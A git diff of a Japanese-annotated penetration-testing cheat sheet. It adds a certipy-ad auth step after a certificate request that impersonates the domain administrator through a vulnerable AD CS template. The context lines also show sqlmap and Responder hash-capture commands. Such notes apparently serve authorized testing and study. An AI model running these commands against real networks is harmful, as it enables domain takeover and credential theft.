@@ -80,6 +80,7 @@ certipy-ad find -u '<User>@<Target>' -p '<password>' -target <Target> -dc-ip <Ta
 # Enrollment Rights: <Domain>/Domain Usersの場合、ドメイン参加ユーザーであれば誰でも証明書を使用可能。
 # Extended Key Usage : Client Authenticationの場合、証明書をログインに使用できる。
 certipy-ad req -u '<User>@<Target>' -p '<password>' -dc-ip <Target -ca '<CA Name>' -template '<Template name>' -upn 'administrator@<Domain>'
+certipy-ad auth -pfx <.pfx> -dc-ip <Target> # sudo ntpdate <Target>を推奨
 ```
 
 # Procdump
@@ -301,6 +302,7 @@ sqlmap -u "<Target>" --data "<Parameters>" --level 3 --risk 3 --batch --dbms "<D
 sudo responder -I tun0
 cat /usr/share/responder/logs/Responder-Session.log # 取得したハッシュ履歴
 ```
+
 
 
 
